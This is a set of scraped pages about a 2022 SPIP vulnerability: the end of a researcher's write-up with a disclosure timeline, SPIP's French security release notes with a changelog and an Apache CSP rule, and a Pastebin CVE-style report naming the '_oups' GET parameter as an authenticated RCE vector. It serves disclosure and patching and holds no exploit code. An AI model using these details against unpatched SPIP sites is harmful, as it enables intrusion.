It is now base64 encoded and converted to json.
![form](/posts/rmrce/p1.png)

The whole thing will be passed to the html entities function

![form](/posts/rmrce/p2.png)

## Timeline

* **2022/07/05 at 3:38 PM**: XSS/CSRF was discovert and report to SPIP.
* **2022/07/05 at 6:07 PM**: First response of SPIP.
* **2022/07/12** : New [commit](https://github.com/spip/SPIP/commit/d569096f346f54552ecf2b0f09c2880219288cb3) on spip.
* **2022/07/12 at 1:13 AM**: Declaration of the RCE to SPIP.
* **2022/07/12 at 11:18 AM**: First [commit](https://github.com/spip/SPIP/commit/31691fd689234b290db5f6c9cbae9aff06aca74a) to fix the RCE.
* **2022/07/22**: [New security release](https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-1-5-SPIP-4-0-8-et-SPIP-3-2-16.html).

## Conclusion & Thanks

It was a great experience to share our research with [Abyss Watcher](https://github.com/Abyss-W4tcher). We are happy to have contributed to the security of SPIP and Root-Me. Many thanks to [Laluka](https://twitter.com/TheLaluka) and [W0rty](https://twitter.com/_worty) for proofreading this article.

![form](/posts/rmrce/sq.jpg)

## References

* **Abyss Watcher Article**: [https://github.com/Abyss-W4tcher/…](https://github.com/Abyss-W4tcher/ab4yss-wr4iteups/blob/master/SPIP%204.1.2%20Vulnerabilities/SPIP_4.1.2_AUTH_RCE/SPIP_4.1.2_AUTH_RCE_Abyss_Watcher_12_07_22.md)
* **Laluka’s RCE** : <https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/>
* **SPIP release** : <https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-1-5-SPIP-4-0-8-et-SPIP-3-2-16.html>

---

[RCE](https://SpawnZii.github.io/tags/rce/)
[root-me](https://SpawnZii.github.io/tags/root-me/)
[spip](https://SpawnZii.github.io/tags/spip/)
[bugs](https://SpawnZii.github.io/tags/bugs/)

[Bug](https://SpawnZii.github.io/categories/bug/)

976 Words

2022-07-12 13:02

---

[←
[Avent ESNA] Web - Papa noël gère ses documents Introduction](https://SpawnZii.github.io/posts/2022/12/avent-esna-web-papa-no%C3%ABl-g%C3%A8re-ses-documents-introduction/)

[[Midnightflag] BGK Writeup
→](https://SpawnZii.github.io/posts/2022/04/midnightflag-bgk-writeup/)

© 2023
[SpawnZii](https://SpawnZii.github.io/)



=== Content from blog.spip.net_dc4c84bc_20250115_090147.html ===

**[![](local/cache-vignettes/L96xH96/siteon0-47b07.png?1666949430)SPIP Blog](https://blog.spip.net/ "Accueil")**

Du logiciel libre et de la tendresse

* [Gazette](-Gazette-.html)
* [Release](-Release-.html)
* [Développement](-Developpement-.html)
* [Communauté](-Communaute-.html)
* [Ailleurs](-Ailleurs-.html)

[Accueil](https://blog.spip.net/) > [Release](-Release-.html) > **Mise à jour critique de sécurité : sortie de SPIP 4.1.5, SPIP 4.0.8 et SPIP (…)**

# Mise à jour critique de sécurité : sortie de SPIP 4.1.5, SPIP 4.0.8 et SPIP 3.2.16

jeudi 21 juillet 2022, par [La team](_La-team_.html)

Suite au signalement de plusieurs failles critiques de sécurité, nous publions les version 4.1.5, 4.0.8 et 3.2.16. Un grand merci à SpawnZii, Abyss Watcher & Sapperlotti pour ces signalements.

Ces versions corrigent des failles critiques dont une pouvait permettre de l’exécution de code (RCE) depuis l’espace public dans certains contextes de saisie utilisateur, et d’autres utilisant des XSS entre auteurs depuis l’espace d’administration pouvant permettre de réaliser une promotion de privilège de son compte dans le cadre de sites multi-utilisateurs.

Encore une fois, merci à Abyss Watcher, SpawnZii et Sapperlotti pour les analyses complètes et détaillées transmises.

**La faille permettant l’exécution de code (RCE) est prise en charge par l’écran de sécurité.**

Dans un cadre préventif afin de limiter l’exploitation de failles XSS, SPIP (en 4.0 et 4.1) envoie maintenant, dans l’espace privé, une entête CSP (Content Security Policy) « sandbox » qui limite certaines activités sur les iframes. Cela pourrait empêcher le fonctionnement correct de certains sites déployés dans une iframe (heureusement, il ne devrait pas y avoir grand monde concerné).

De même, en prévention, nous avons ajouté (en SPIP 3.2, 4.0 et 4.1) ce CSP (Content Security Policy) « sandbox » dans une règle du fichier `htaccess.txt` fourni avec SPIP lors de l’appel à des fichiers du répertoire `IMG/`

Il est conseillé donc de mettre à jour votre fichier `.htaccess` (ou équivalent) en conséquence. Pour Apache, cela consiste à ajouter la règle suivante :

<IfModule mod\_headers.c>
RewriteCond %{REQUEST\_FILENAME} -f
RewriteRule ^IMG/ - [env=sandbox:sandbox,skip=100]
Header add Content-Security-Policy "sandbox" env=sandbox
</IfModule>

En plus des corrections de sécurité, la branche 4.1 a bénéficié de corrections de bugs, dont certaines ont été reportées dans la branche 4.0.

Si vous vous demandez pourquoi on est passé de la 4.1.2 à la 4.1.5, c’est tout simplement parce que la 4.1.3 et la 4.1.4 sont parties en fumée :p (plus sérieusement, ces tags comportaient une erreur de release).

## À propos de SPIP 4.2

Comme vous vous en doutez, nous n’avons pas avancé autant que souhaité initialement sur une version SPIP 4.2, qui ne sortira donc pas fin juillet et est donc repoussée (au moins) après cet été brûlant. La maintenance de SPIP 4.1 est évidemment maintenue tant qu’une version 4.2 n’est pas proposée.

## Corrections principales apportées par SPIP 4.1.5

**SPIP Core**

*Security*

* [#5256](https://git.spip.net/spip/spip/pulls/5256) Bloquer la modification d’un auteur via une XMLHttpRequest ou une iframe
* spip-team/securite#4832 Envoyer un CSP sandbox sur tous les documents de IMG via une RewriteRule du htaccess.txt modèle
* spip-team/securite#4835 Mise a jour de l’écran de sécurité en version 1.4.2
* spip-team/securite#4835 Sécuriser le paramètre `_oups` dans le formulaire d’édition de liens
* spip-team/securite#4833 Signaler visuellement les liens javascript dans les zones éditoriales
* spip-team/securite#4831 Correction des traitements des balises `#INFO_` dans l’espace privé

*Added*

* spip-team/securite#4832 spip-team/securite#4833 une fonction `auth_controler_password_auteur_connecte()` pour securiser une action

*Fixed*

* [#5228](https://git.spip.net/spip/spip/pulls/5228) Rétablir le filtrage des valeurs `null` envoyées à la fonction `objet_modifier_champs()`
* [#5223](https://git.spip.net/spip/spip/pulls/5223) Éviter une erreur fatale sur `sql_selectdb()` sur une base inexistante en mysql
* [#5218](https://git.spip.net/spip/spip/pulls/5218) Éviter l’autocomplétion d’identifiants email en éditant un auteur
* [#5209](https://git.spip.net/spip/spip/pulls/5209) [#5221](https://git.spip.net/spip/spip/pulls/5221) Fonctionnement de Imagick sous Windows
* [#5206](https://git.spip.net/spip/spip/pulls/5206) Échouer en minipres si on ne peut pas écrire le fichier des clés lors du login
* [#5213](https://git.spip.net/spip/spip/pulls/5213) Prendre en compte le sens du critère `tri` en présence d’un tri `multi`
* [#5259](https://git.spip.net/spip/spip/pulls/5259) Fatale sur `autoriser` appelé avec un identifiant d’auteur inexistant
* [#5256](https://git.spip.net/spip/spip/pulls/5256) Correction de `#HTTP_HEADER{}` quand la valeur contenait un simple quote
* [#5256](https://git.spip.net/spip/spip/pulls/5256) Corriger `refuser_traiter_formulaire_ajax()` qui ne fonctionnait pas quand un form contenait un élément avec un name ou id `submit`
* spip-contrib-extensions/formidable#119 Échapper les noms de fichier quand on génère une balise img à l’aide du filtre `|balise_img`
* [#4826](https://git.spip.net/spip/spip/pulls/4826) Vignettes fallback quand on ne sait par réduire la taille d’une image du fait de son format
* [#5232](https://git.spip.net/spip/spip/pulls/5232) Correction notice PHP sur `signale_edition()`
* [#5231](https://git.spip.net/spip/spip/pulls/5231) Correction deprecated PHP 8.1 sur `sql_quote(null)`
* [#5242](https://git.spip.net/spip/spip/pulls/5242) Correction warning sur `generer_objet_lien()`
* [#5239](https://git.spip.net/spip/spip/pulls/5239) Éviter une fatale sur un appel de `generer_objet_info()`
* [spip-contrib-extensions/agenda#57](https://git.spip.net/spip-contrib-extensions/agenda/issues/57) Éviter une erreur de typage à l’enregistrement dans certains formulaires
* [#5190](https://git.spip.net/spip/spip/pulls/5190) Dans le formulaire de configuration de l’email de suivi, pouvoir indiquer une liste d’emails séparés par des virgules
* [#5204](https://git.spip.net/spip/spip/pulls/5204) Fix le login lors de la restauration des clés depuis un compte webmestre
* [#5118](https://git.spip.net/spip/spip/pulls/5118) Fix les viewbox erronées lors de la copie locale des SVG sans viewbox
* [#5194](https://git.spip.net/spip/spip/pulls/5194) Améliorer le comportement du bouton « Ajourd’hui » dans le dateur en surlignant le jour courant + ajout option data-todayhighlight sur les input.date + fix option data-clearbtn

**Big Upload**

*Added*

* #[4860](https://git.spip.net/spip/bigup/pulls/4860) Ajout de deux events à l’API JS `bigup.fileAdded` & `bigup.fileSubmitted`
* [#4861](https://git.spip.net/spip/bigup/pulls/4861) `Bigup.send(FormData)` un raccourci pour poster en ajax le formulaire.

*Changed*

* [#4860](https://git.spip.net/spip/bigup/pulls/4860) API JS, compléter l’event ready pour lui passer l’objet form en paramètre

*Fixed*

* [#4861](https://git.spip.net/spip/bigup/pulls/4861) Ne pas perdre certains liens de documents en changeant le fichier d’un document avec Bigup

*Deprecated*

* [#4861](https://git.spip.net/spip/bigup/pulls/4861) `Bigup.getFormData()` est déprécié. Utiliser `Bigup.buildFormData()`

**Compresseur**

*Fixed*

* [#4851](https://git.spip.net/spip/compresseur/pulls/4851) Fix un bug sur les shorthands padding/margin

**Images**

*Fixed*

* Usage de `image_typo` sous Windows

**Medias**

*Security*

* spip-team/securite#4832 et spip-team/securite#4833 appliquer \_TRAITEMENT\_TYPO sur le champs CREDITS et bien visualier le html suspect

*Fixed*

* [#4893](https://git.spip.net/spip/medias/pulls/4893) Il ne faut pas contraindre la taille des SVG
* [#4891](https://git.spip.net/spip/medias/pulls/4891) Amélioration du message d’erreur de taille de document
* [#4889](https://git.spip.net/spip/medias/pulls/4889) Refaire un alter sur la champ mode avant la migration des logos, par précaution

**SVP**

*Security*

* spip-team/securite#4832 et spip-team/securite#4833 Sécuriser le téléchargement de zip de plugin ou l’ajout d’un dépôt par saisie du mot de passe

*Fixed*

* [#4854](https://git.spip.net/spip/svp/pulls/4854) Tout cocher/décocher n’agit que sur les plugins visibles de la liste

**Urls Etendues**

*Added*

* [#4818](https://git.spip.net/spip/urls_etendues/pulls/4818) Tri possible par URLs verrouillées dans les listes d’URLs

*Fixed*

* [#4818](https://git.spip.net/spip/urls_etendues/pulls/4818) Coquille sens de tri sur la liste des urls
## Corrections principales apportées par SPIP 4.0.8

SPIP 4.0 est mis à jour avec les différents correctifs de sécurité.

Il corrige également certains bugs :

* [#5194](https://git.spip.net/spip/spip/pulls/5194) Améliorer le comportement du bouton ’Ajourd’hui’ dans le dateur
* Bigup [#4861](https://git.spip.net/spip/bigup/pulls/4861) Ne pas perdre les liens multiples d’un document lorsqu’on change son fichier
* Medias [#4889](https://git.spip.net/spip/medias/pulls/4889) Refaire un alter sur la champ mode avant la migration des logos, par précaution
## Corrections principales apportées par SPIP 3.2.16

* SPIP 3.2 est mis à jour avec les différents correctifs de sécurité.
* Correction de sa compatibilité avec PHP 5.4 (perdue par inadvertance en SPIP 3.2.15)
## Mettre à jour en utilisant le spip\_loader

Vous pouvez aussi mettre à jour au moyen de la dernière version du spip\_loader (**version 5.2.1**)

Le spip\_loader est maintenant distribué à l’adresse suivante

<https://get.spip.net/>

Le spip\_loader.php est maintenant au format binaire [phar](https://www.php.net/manual/fr/intro.phar.php). Si vous avez besoin de personnaliser l’installation en définissant des constantes, il vous faut créer un fichier de configuration spip\_loader\_config.php (cf <https://www.spip.net/fr_article5705.html>).

## Résumé des versions de SPIP

| Branche | Version | Suivi | Compatibilité PHP |
| --- | --- | --- | --- |

| SPIP 4.1 | [SPIP 4.1.5](https://files.spip.net/spip/archives/spip-v4.1.5.zip) | Branche stable | PHP 7.4 à PHP 8.1 |
| --- | --- | --- | --- |
| SPIP 4.0 | [SPIP 4.0.8](https://files.spip.net/spip/archives/spip-v4.0.8.zip) | Branche stable | PHP 7.3 à PHP 8.0 |
| SPIP 3.2 | [SPIP 3.2.16](https://files.spip.net/spip/archives/spip-v3.2.16.zip) | Branche stable | PHP 5.4 à PHP 7.4 |

Les versions **SPIP 3.1 et antérieures** ne sont plus maintenues.

Pour connaître le détail des versions maintenues :

<https://www.spip.net/fr_article6500.html>

## Comment être tenu au courant de ces annonces ?

C’est simple, inscrivez-vous sur la mailing liste <https://discuter.spip.net/c/spip-ann/13>

Bien sûr, les réseaux sociaux sont de la partie :

* Seenthis : <https://seenthis.net/people/spip>
* Twitter : <https://twitter.com/spip>
* Facebook : <https://www.facebook.com/spip.net>
* Mamot : [https://mamot.fr/@spip](https://mamot.fr/%40spip)
## Une question, besoin d’aide ?

En cas de problème ou de difficultés, il y aura certainement quelqu’un pour vous aider sur IRC, N’hésitez pas à venir poser vos questions <https://irc.spip.net>

Vous pouvez aussi poster un message et échanger sur :

* La liste des utilisateurs et utilisatrices <https://discuter.spip.net/c/spip/6>
* La liste du développement spip-dev <https://discuter.spip.net/c/spip-dev/5>

Nous vous rappelons que pour signaler une faille, il suffit d’envoyer un mail à spip-team@rezo.net.

## Messages

* [21 juillet 2022, 20:23, par Mathieu](#forum6245 "Lien permanent vers le commentaire 6245")

  Merci pour la faille RCE corrigée via l’écran de sécurité, vous m’avez sauvé mon WE !
* [21 juillet 2022, 20:30, par petit rat](#forum6246 "Lien permanent vers le commentaire 6246")

  Merci pour le boulot fourni même en plein été. Viva spip
* [21 juillet 2022, 21:21, par Marcimat](#forum6247 "Lien permanent vers le commentaire 6247")

  Une coquille s’est glissée dans le plugin SVP d’administration des plugins, sur SPIP 4.0.8 et SPIP 4.1.5, qui rend le bouton « Cocher toutes les mises à jour » inopérant !

  La correction est riquiqui (un `false` qui devient `true`) si ça vous intéresse en attendant une prochaine version…

  <https://git.spip.net/spip/svp/commit/f992981f>
* [29 juillet 2022, 13:35, par RealET](#forum6248 "Lien permanent vers le commentaire 6248")

  Bonjour,

  J’ai une question sur la gravité attachée à ce sandbox sur IMG/

  Quel est le risque de ne pas le faire ?

  PS : par ailleurs, je cherche la syntaxe à utiliser dans le cadre de la mutualisation facile de SPIP, avec des dossiers en sites/\*/IMG/

Rechercher :

## Dans la même rubrique

* [Mise à jour de maintenance : sortie de SPIP 4.3.5](Mise-a-jour-de-maintenance-sortie-de-SPIP-4-3-5.html)
* [Mise à jour de maintenance : sortie de SPIP 4.3.4](Mise-a-jour-de-maintenance-sortie-de-SPIP-4-3-4.html)
* [Mise à jour de maintenance : sortie de SPIP 4.3.3](Mise-a-jour-de-maintenance-sortie-de-SPIP-4-3-3.html)
* [Mise à jour critique de sécurité : sortie de SPIP 4.3.2, SPIP 4.2.16, SPIP 4.1.18](Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-2-SPIP-4-2-16-SPIP-4-1-18.html)
* [Mise à jour de maintenance : sortie de SPIP 4.3.1](Mise-a-jour-de-maintenance-sortie-de-SPIP-4-3-1.html)
* [Sortie de SPIP 4.3.0](Sortie-de-SPIP-4-3-0.html)
* [Mise à jour de maintenance et sécurité :  sortie de SPIP 4.2.15](Mise-a-jour-de-maintenance-et-securite-sortie-de-SPIP-4-2-15.html)
* [Sortie de SPIP 4.3.0-beta](Sortie-de-SPIP-4-3-0-beta.html)
* [Mise à jour de maintenance : sortie de SPIP 4.2.14, SPIP 4.1.17](Mise-a-jour-de-maintenance-sortie-de-SPIP-4-2-14-SPIP-4-1-17.html)
* [Mise à jour critique de sécurité : sortie de SPIP 4.3.0-alpha2, SPIP 4.2.13, SPIP 4.1.16](Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-0-alpha2-SPIP-4-2-13-SPIP-4.html)

2005 - 2025 SPIP Blog

[![SPIP](spip.png)](https://www.spip.net/ "Site réalisé avec SPIP")



=== Content from pastebin.com_f6214057_20250115_090148.html ===


[Pastebin](/)
[API](/doc_api)
[tools](/tools)
[faq](/faq)

[paste](/)

[Login](/login)
[Sign up](/signup)

Advertisement

SHARE
TWEET

![Abyss_-_Watcher](/themes/pastebin/img/guest.png)
# Untitled

[Abyss\_-\_Watcher](/u/Abyss_-_Watcher)

Dec 13th, 2022
(edited)

4,342
0
Never
[Add comment](/login?return_url=%2FZH7CPc8X%23add_comment)

**Not a member of Pastebin yet?**
[**Sign Up**](/signup),
it unlocks many cool features!

[text](/archive/text) 1.88 KB
| None
|
[0](/login?return_url=%2FZH7CPc8X "Like") [0](/login?return_url=%2FZH7CPc8X "Dislike")
[raw](/raw/ZH7CPc8X)
[download](/dl/ZH7CPc8X)
[clone](/clone/ZH7CPc8X)
[embed](/embed/ZH7CPc8X)
[print](/print/ZH7CPc8X)
[report](/report/ZH7CPc8X)

1. [Suggested description]
2. RCE in SPIP 3.1.13 through 4.1.2 allows remote authenticated users to execute arbitrary code via "\_oups" GET parameter
4. ------------------------------------------
6. [VulnerabilityType]
7. Code injection
9. ------------------------------------------
11. [Vendor of Product]
12. SPIP - Systeme de Publication pour Internet
14. ------------------------------------------
16. [Affected Product Code Base]
17. SPIP - 3.1.13 - 3.1.14 - 3.2.8 - 3.2.9 - 3.1.15 - 3.2.10 - 3.2.11 - 4.0.0 - 4.0.1 - 3.2.12 - 4.0.2 - 4.0.3 - 4.0.4 - 3.2.13 - 3.2.14 - 4.0.5 - 4.1.0 - 4.1.1 - 4.0.6 - 4.1.2 - 4.0.7 - 3.2.15
19. ------------------------------------------
21. [Affected Component]
22. https://github.com/spip/SPIP/blob/0394b44774555ae8331b6e65e35065dfa0bb41e4/prive/formulaires/editer\_liens.php#L131
24. ------------------------------------------
26. [Attack Type]
27. Remote
29. ------------------------------------------
31. [Impact Code execution]
32. true
34. ------------------------------------------
36. [Attack Vectors]
37. To exploit vulnerability, an authenticated user with backend access must send a malicious payload (PHP code) in a GET parameter. The server will interpret it and render results to user.
39. ------------------------------------------
41. [Reference]
42. https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-1-5-SPIP-4-0-8-et-SPIP-3-2-16.html
43. https://github.com/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/SPIP\_4.1.2\_AUTH\_RCE/SPIP\_4.1.2\_AUTH\_RCE\_Abyss\_Watcher\_12\_07\_22.md
44. https://spawnzii.github.io/posts/2022/07/how-we-have-pwned-root-me-in-2022/
46. ------------------------------------------
48. [Has vendor confirmed or acknowledged the vulnerability?]
49. true
51. ------------------------------------------
53. [Discoverer]
54. Abyss Watcher ; SpawnZii

Advertisement

Add Comment
Please, [**Sign In**](/login?return_url=%2FZH7CPc8X%23add_comment) to add comment

Advertisement

[Public Pastes](/archive)

* [BTC ACCOUNTS HACKED](/FTVwYHLY)
  JavaScript |
  1 sec ago
  | 0.09 KB
* [Leaked by Zak](/2R5gJ6Nw)
  JavaScript |
  2 sec ago
  | 0.09 KB
* [⭐ Binance Account hack CV](/bhw81ZUS)
  JavaScript |
  2 sec ago
  | 0.25 KB
* [Brazzers accounts](/uwUSzpBR)
  JavaScript |
  7 sec ago
  | 0.09 KB
* [BTC ACCOUNTS HACKED](/GfSuwAJz)
  JavaScript |
  8 sec ago
  | 0.09 KB
* [Amazon Gift cards LEAKED](/yMH70Qz8)
  JavaScript |
  9 sec ago
  | 0.09 KB
* [Chaturbate Accounts with Tokens](/gNi5yEn0)
  JavaScript |
  11 sec ago
  | 0.09 KB
* [Leaked by Zak](/Pjw5tkMa)
  JavaScript |
  12 sec ago
  | 0.09 KB

Advertisement

[create new paste](/)  /
[syntax languages](/languages)  /
[archive](/archive)  /
[faq](/faq)  /
[tools](/tools)  /
[night mode](/night_mode)  /
[api](/doc_api)  /
[scraping api](/doc_scraping_api)  /
[news](/news)  /
[pro](/pro)

[privacy statement](/doc_privacy_statement)  /
[cookies policy](/doc_cookies_policy)  /
[terms of service](/doc_terms_of_service) /
[security disclosure](/doc_security_disclosure)  /
[dmca](/dmca)  /
[report abuse](/report-abuse)  /
[contact](/contact)

By using Pastebin.com you agree to our [cookies policy](/doc_cookies_policy) to enhance your experience.

Site design & logo © 2025 Pastebin

We use cookies for various purposes including analytics. By continuing to use Pastebin, you agree to our use of cookies as described in the [Cookies Policy](/doc_cookies_policy).  OK, I Understand

[![](/themes/pastebin/img/hello.webp)](/signup)

Not a member of Pastebin yet?


